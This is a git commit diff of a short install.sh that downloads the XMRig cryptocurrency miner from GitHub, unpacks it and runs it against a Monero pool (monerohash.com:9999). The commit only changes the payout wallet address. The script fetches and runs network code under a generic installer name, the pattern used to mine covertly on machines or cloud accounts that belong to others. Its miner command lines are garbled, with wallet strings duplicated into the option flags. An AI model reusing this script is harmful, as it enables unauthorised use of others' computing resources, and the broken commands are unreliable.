b43c17a1cd54fd31d388db22704555f9a7cc29dd
Jay9112002 <86427093+Jay9112002@users.noreply.github.com>
2021-07-02 09:28:07 +0530

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,4 +1,4 @@
 wget https://github.com/xmrig/xmrig/releases/download/v6.7.0/xmrig-6.7.0-linux-x64.tar.gz
 tar xzvf xmrig-6.7.0-linux-x64.tar.gz
 rm xmrig-6.7.0-linux-x64.tar.gz
-./xmrig-6.7.0/xmrig -o monerohash.com:9999 -u 48xoAqhD1QaZMTr2KYi8VpQWQkQ7z1y7uj6rSvQWBBLe88YRnEWqAjxNgwUnRAhzheYtBUhgws6JGHsq67WtjY4q7nEBKi9 -k --tlsAqhD1QaZMTr2KYi8VpQWQkQ7z1y7uj6rSvQWBBLe88YRnEWqAjxNgwUnRAhzheYtBUhgws6JGHsq67WtjY4q7nEBKi9 -k --tls
+./xmrig-6.7.0/xmrig -o monerohash.com:9999 -u 891rxrC7igo2TMyWwmVRYgF1owP2aEVYdRcwvLSwvcSyDDxmnyur55w19DhEcPy82KNDSXGBAiwjkNbbidwAoywnNUPZNAe -k --891rxrC7igo2TMyWwmVRYgF1owP2aEVYdRcwvLSwvcSyDDxmnyur55w19DhEcPy82KNDSXGBAiwjkNbbidwAoywnNUPZNAe -k --tls
